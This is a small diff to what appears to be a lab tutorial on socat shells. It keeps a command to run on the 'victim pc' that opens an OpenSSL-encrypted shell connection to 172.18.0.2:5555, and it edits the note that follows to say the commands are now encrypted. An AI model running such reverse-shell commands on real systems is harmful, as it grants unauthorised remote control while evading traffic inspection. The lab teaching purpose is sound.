@@ -44,5 +44,5 @@ on the victim pc run the following command:
 
 `socat -d openssl:172.18.0.2:5555,verify=0`
 
-as your run this command you will obtain a dumb shell.
+as your run this command you will obtain a dumb shell, but the commands are now encrypted (check the secret.cap)
 
